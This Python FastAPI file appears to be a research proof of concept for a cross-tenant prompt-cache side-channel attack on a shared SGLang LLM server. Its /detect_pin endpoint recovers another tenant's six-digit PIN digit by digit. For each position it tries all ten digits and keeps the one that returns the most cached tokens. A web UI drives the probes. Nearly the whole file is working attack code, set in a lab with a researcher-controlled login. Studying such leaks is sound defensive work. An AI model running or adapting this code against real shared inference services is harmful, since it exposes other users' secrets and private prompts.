"""
attacker_app.py — "Document Assistant" (Tenant B / User B)
Port 8002. Zero import of, or reference to, victim_app.py or any secret.
"""
import sys, os, secrets
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "experiments", "sglang"))

from fastapi import FastAPI, HTTPException, Header
from pydantic import BaseModel
from typing import Optional
from shared_client import send_to_sglang, flush_cache
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "experiments", "sglang"))
from config import PIN_LABEL, PIN_SEPARATOR, PIN_TRAILING_MARKER

app = FastAPI(title="Document Assistant (User B)")

PIN_LENGTH = 6
PLACEHOLDER_DIGIT = "X"  # non-digit placeholder - avoids confound with guessing digit 0

def format_pin(digits: str) -> str:
    return PIN_SEPARATOR.join(list(digits))

def pin_probe(known_prefix: str, guess_digit: str) -> dict:
    remaining = PIN_LENGTH - len(known_prefix) - 1
    guess_digits = known_prefix + guess_digit + PLACEHOLDER_DIGIT * remaining
    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(guess_digits) + PIN_TRAILING_MARKER
    return send_to_sglang(prompt)

SHARED_PUBLIC_PREFIX = (
    "You are a customer support assistant for a cloud infrastructure company. "
    "Below is the internal knowledge base context shared across all support sessions. "
    "Use this context to answer user questions about billing, deployment, and account "
    "management. Always be concise and professional. The following section contains "
    "account-specific context for the current session: "
) * 3

_VALID_USERS = {"user_b": "researcher-controlled-password"}
_sessions = {}

class LoginRequest(BaseModel):
    username: str
    password: str

class LoginResponse(BaseModel):
    token: str

class ProbeRequest(BaseModel):
    guess: str

@app.post("/login", response_model=LoginResponse)
def login(req: LoginRequest):
    if _VALID_USERS.get(req.username) != req.password:
        raise HTTPException(status_code=401, detail="invalid credentials")
    token = secrets.token_hex(16)
    _sessions[token] = req.username
    return LoginResponse(token=token)

@app.post("/logout")
def logout(authorization: Optional[str] = Header(None)):
    token = _sessions.pop(authorization, None) and authorization
    return {"logged_out": token is not None}

@app.post("/probe")
def probe(req: ProbeRequest, authorization: Optional[str] = Header(None)):
    if authorization not in _sessions:
        raise HTTPException(status_code=401, detail="not logged in")
    prompt = SHARED_PUBLIC_PREFIX + req.guess
    result = send_to_sglang(prompt)
    return {
        "wall_clock_latency": result["wall_clock_latency"],
        "cached_tokens": result["cached_tokens"],
        "prompt_tokens": result["prompt_tokens"],
    }

@app.post("/detect_pin")
def detect_pin(authorization: Optional[str] = Header(None)):
    """Attacker-side sequential PIN recovery. This function ONLY ever uses
    its own previously-recovered digits (never ground truth) to build each
    next probe. No victim data is imported or referenced anywhere here."""
    if authorization not in _sessions:
        raise HTTPException(status_code=401, detail="not logged in")

    import time as _time
    recovered = ""
    per_position_detail = []

    for position in range(PIN_LENGTH):
        best_digit = None
        best_cached = -1
        candidates = []
        for guess in "0123456789":
            r = pin_probe(recovered, guess)
            candidates.append({"guess": guess, "cached_tokens": r["cached_tokens"]})
            if r["cached_tokens"] > best_cached:
                best_cached = r["cached_tokens"]
                best_digit = guess
        per_position_detail.append({"position": position + 1, "candidates": candidates, "chosen": best_digit})
        recovered += best_digit

    return {"recovered_pin": recovered, "detail": per_position_detail}

@app.post("/flush")
def flush():
    return {"flush_result": flush_cache()}

from fastapi.responses import HTMLResponse

@app.get("/", response_class=HTMLResponse)
def attacker_ui():
    return """
    <html><body style="font-family:sans-serif;max-width:400px;margin:40px auto;">
    <h2>Document Assistant (User B)</h2>
    <div id="login">
      <input id="u" placeholder="username" value="user_b"><br><br>
      <input id="p" placeholder="password" type="password" value="researcher-controlled-password"><br><br>
      <button onclick="login()">Login</button>
    </div>
    <div id="app" style="display:none;">
      <p>Logged in. Send a probe to detect recent cache activity:</p>
      <input id="guess" placeholder="probe text" value="unknown guess"><br><br>
      <button onclick="probe()">Probe</button>
      <button onclick="detectPin()">Detect PIN</button>
      <button onclick="logout()">Logout</button>
      <p id="msg"></p>
    </div>
    <script>
    let token = null;
    async function login() {
      const r = await fetch('/login', {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({username: document.getElementById('u').value, password: document.getElementById('p').value})});
      if (r.ok) {
        const d = await r.json();
        token = d.token;
        document.getElementById('login').style.display = 'none';
        document.getElementById('app').style.display = 'block';
      } else {
        alert('Login failed');
      }
    }
    async function probe() {
      const r = await fetch('/probe', {method:'POST', headers:{'Content-Type':'application/json','Authorization':token},
        body: JSON.stringify({guess: document.getElementById('guess').value})});
      const d = await r.json();
      document.getElementById('msg').innerHTML =
        'cached_tokens: <b>' + d.cached_tokens + ' / ' + d.prompt_tokens + '</b><br>latency: ' + d.wall_clock_latency.toFixed(4) + 's';
    }
    async function detectPin() {
      document.getElementById('msg').innerHTML = 'Detecting... (takes ~10-20s)';
      const r = await fetch('/detect_pin', {method:'POST', headers:{'Authorization':token}});
      const d = await r.json();
      document.getElementById('msg').innerHTML = '<b>Recovered PIN: ' + d.recovered_pin + '</b>';
    }
    async function logout() {
      await fetch('/logout', {method:'POST', headers:{'Authorization':token}});
      token = null;
      document.getElementById('app').style.display = 'none';
      document.getElementById('login').style.display = 'block';
      document.getElementById('msg').innerText = 'Logged out.';
    }
    </script>
    </body></html>
    """
